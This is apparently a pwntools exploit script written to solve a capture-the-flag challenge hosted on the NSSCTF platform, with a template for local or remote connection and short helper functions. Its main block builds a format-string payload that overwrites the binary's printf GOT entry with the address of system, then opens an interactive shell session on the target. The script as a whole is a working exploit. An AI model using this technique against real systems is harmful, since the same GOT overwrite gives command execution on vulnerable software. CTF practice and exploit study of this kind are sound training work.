#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 0
os_level = 32
binary_name = 'pwn'
remote_addr, port = 'node5.anna.nssctf.cn:20839'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF('libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)


#Main function
if __name__ == '__main__':
    #you can add your code here
    payload = fmtstr_payload(11,{elf.got['printf']:elf.plt['system']})
    sl(payload)
    p.interactive()